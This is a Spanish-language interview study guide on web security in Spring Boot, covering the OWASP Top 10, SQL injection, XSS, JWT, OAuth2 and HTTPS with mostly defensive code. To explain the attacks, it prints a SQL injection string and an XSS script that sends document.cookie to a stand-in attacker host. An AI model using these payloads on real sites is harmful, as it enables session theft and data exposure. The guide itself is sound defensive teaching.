# Seguridad y OWASP

---

## 1. OWASP Top 10 (vulnerabilidades mas comunes)

| # | Vulnerabilidad | Que es | Como prevenir |
|---|---------------|--------|---------------|
| 1 | **Injection** (SQL, NoSQL, LDAP) | Inyectar codigo malicioso en queries | Usar PreparedStatement, JPA, validar input |
| 2 | **Broken Authentication** | Sesiones mal gestionadas, passwords debiles | JWT con expiracion, bcrypt, MFA |
| 3 | **Sensitive Data Exposure** | Datos sensibles sin cifrar | HTTPS, cifrar en BD, no loggear datos sensibles |
| 4 | **XML External Entities (XXE)** | Parsear XML malicioso | Deshabilitar DTD, usar JSON |
| 5 | **Broken Access Control** | Acceder a recursos sin permiso | Validar roles en backend, @PreAuthorize |
| 6 | **Security Misconfiguration** | Configs por defecto, endpoints expuestos | Deshabilitar actuator en prod, headers de seguridad |
| 7 | **XSS (Cross-Site Scripting)** | Inyectar JavaScript en el frontend | Escapar output, Content-Security-Policy |
| 8 | **Insecure Deserialization** | Deserializar objetos maliciosos | Validar tipos, no aceptar objetos de fuentes externas |
| 9 | **Using Components with Known Vulns** | Dependencias con CVEs | OWASP Dependency Check, actualizar librerias |
| 10 | **Insufficient Logging** | No detectar ataques por falta de logs | Loggear intentos fallidos, alertas, audit trail |

---

## 2. SQL Injection y como prevenirlo

```java
// VULNERABLE - concatenar strings en query
String query = "SELECT * FROM usuarios WHERE email = '" + email + "'";
// Atacante envia: ' OR '1'='1' --
// Query resultante: SELECT * FROM usuarios WHERE email = '' OR '1'='1' --'
// Retorna TODOS los usuarios

// SEGURO - PreparedStatement (parametrizado)
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM usuarios WHERE email = ?"
);
ps.setString(1, email);  // el driver escapa automaticamente
ResultSet rs = ps.executeQuery();

// SEGURO - JPA (usa PreparedStatement internamente)
@Query("SELECT u FROM Usuario u WHERE u.email = :email")
Optional<Usuario> findByEmail(@Param("email") String email);

// SEGURO - Spring Data (metodos derivados)
Optional<Usuario> findByEmail(String email); // Spring genera PreparedStatement
```

> **Tip entrevista:** "Nunca concateno strings para queries SQL. Siempre uso PreparedStatement o JPA que parametrizan automaticamente. Ademas, valido el input en la capa de Controller con anotaciones como @Valid."

---

## 3. XSS (Cross-Site Scripting)

```java
// VULNERABLE - mostrar input del usuario sin escapar
// Usuario envia: <script>document.location='http://atacante.com/steal?cookie='+document.cookie</script>
// Si el backend lo guarda y otro usuario lo ve, ejecuta el script

// PREVENCION en Spring Boot:
// 1. Thymeleaf escapa por defecto con th:text (NO usar th:utext)
// 2. En APIs REST, Jackson serializa como texto plano (no ejecuta HTML)
// 3. Headers de seguridad:
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp ->
                csp.policyDirectives("default-src 'self'"))  // solo scripts del mismo dominio
            .xssProtection(xss -> xss.headerValue(
                XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
        );
        return http.build();
    }
}
```

---

## 4. Autenticacion con JWT (JSON Web Token)

```java
// Estructura del JWT: HEADER.PAYLOAD.SIGNATURE
// Header:  {"alg": "HS256", "typ": "JWT"}
// Payload: {"sub": "usuario@mail.com", "roles": ["ADMIN"], "exp": 1700000000}
// Signature: HMACSHA256(base64(header) + "." + base64(payload), SECRET_KEY)

// Flujo completo:
// 1. Cliente envia POST /auth/login con credenciales
// 2. Backend valida credenciales, genera JWT con roles y expiracion
// 3. Cliente guarda JWT y lo envia en cada request: Authorization: Bearer <token>
// 4. Backend valida firma + expiracion en cada request (filtro)

// Generar JWT
@Service
public class JwtService {
    @Value("${jwt.secret}")
    private String secret;

    public String generarToken(Usuario usuario) {
        return Jwts.builder()
            .setSubject(usuario.getEmail())
            .claim("roles", usuario.getRoles())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + 3600000)) // 1 hora
            .signWith(Keys.hmacShaKeyFor(secret.getBytes()), SignatureAlgorithm.HS256)
            .compact();
    }

    public String extraerEmail(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(secret.getBytes())
            .build()
            .parseClaimsJws(token)
            .getBody()
            .getSubject();
    }
}

// Filtro que valida JWT en cada request
@Component
public class JwtFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain chain) throws Exception {

        String header = request.getHeader("Authorization");
        if (header != null && header.startsWith("Bearer ")) {
            String token = header.substring(7);
            String email = jwtService.extraerEmail(token);

            UsernamePasswordAuthenticationToken auth =
                new UsernamePasswordAuthenticationToken(email, null, authorities);
            SecurityContextHolder.getContext().setAuthentication(auth);
        }
        chain.doFilter(request, response);
    }
}
```

---

## 5. OAuth2 - Flujo con proveedor externo

```
Flujo Authorization Code (el mas seguro):

1. Usuario clickea "Login con Google"
2. App redirige a Google: /authorize?client_id=XXX&redirect_uri=http://mi-app/callback
3. Usuario se autentica en Google y autoriza
4. Google redirige a mi-app con un CODE: /callback?code=ABC123
5. Backend intercambia CODE por ACCESS TOKEN (server-to-server, seguro)
   POST https://oauth2.googleapis.com/token
   { code: "ABC123", client_id: "XXX", client_secret: "YYY" }
6. Google responde con access_token + id_token (JWT)
7. Backend usa el token para obtener datos del usuario
```

```java
// Spring Boot + OAuth2 (minima configuracion)
// Dependencia: spring-boot-starter-oauth2-client

// application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope: openid, profile, email

// Security Config
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(Customizer.withDefaults());  // habilita login con Google
        return http.build();
    }
}
```

---

## 6. Buenas practicas de seguridad en Spring Boot

```java
// 1. NUNCA loggear datos sensibles
log.info("Usuario logueado: {}", email);          // OK
log.info("Password: {}", password);                // NUNCA
log.info("Token: {}", jwt);                        // NUNCA

// 2. Variables de entorno para secrets (no hardcodear)
// application.yml
spring:
  datasource:
    password: ${DB_PASSWORD}       # variable de entorno
jwt:
  secret: ${JWT_SECRET}            # variable de entorno

// 3. Passwords hasheados con BCrypt
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();  // hash + salt automatico
}
// Guardar: passwordEncoder.encode("mi-password") → "$2a$10$..."
// Verificar: passwordEncoder.matches("mi-password", hashGuardado) → true/false

// 4. CORS configurado (no usar allowAll en produccion)
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://mi-frontend.com")  // dominios especificos
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Authorization", "Content-Type");
    }
}

// 5. Rate limiting para prevenir brute force
// Usar Bucket4j o Resilience4j @RateLimiter

// 6. Validar input SIEMPRE
@PostMapping("/usuarios")
public ResponseEntity<?> crear(@Valid @RequestBody UsuarioDTO dto) { ... }
// @NotBlank, @Email, @Size validan antes de llegar al servicio
```

---

## 7. HTTPS y cifrado

```
HTTP vs HTTPS:
- HTTP: texto plano, cualquiera puede interceptar (man-in-the-middle)
- HTTPS: cifrado TLS/SSL, datos viajan encriptados

En Spring Boot (desarrollo):
  server.ssl.key-store=classpath:keystore.p12
  server.ssl.key-store-password=${SSL_PASSWORD}
  server.port=8443

En produccion:
  - Terminar SSL en el Load Balancer o API Gateway (Azure APIM, nginx)
  - Backend recibe HTTP internamente (mas eficiente)
  - Certificados via Let's Encrypt o proveedor cloud
```

---

## RESPUESTAS RAPIDAS - SEGURIDAD

| Pregunta | Respuesta |
|----------|-----------|
| Que es OWASP? | Organizacion que publica las 10 vulnerabilidades web mas criticas |
| Como prevenir SQL Injection? | PreparedStatement o JPA (nunca concatenar strings en queries) |
| Que es XSS? | Inyectar JavaScript malicioso que ejecuta en el navegador de otro usuario |
| Que es JWT? | Token firmado con header.payload.signature. Autocontenido, no requiere sesion en servidor |
| JWT vs Session? | JWT es stateless (escala mejor). Session requiere almacenamiento en servidor |
| Que es OAuth2? | Protocolo de autorizacion delegada (login con Google, GitHub, etc.) |
| Como guardar passwords? | BCrypt (hash + salt). NUNCA texto plano ni MD5/SHA1 |
| Que es CORS? | Politica que controla que dominios pueden hacer requests a tu API |
| HTTPS que protege? | Cifra la comunicacion entre cliente y servidor (evita man-in-the-middle) |
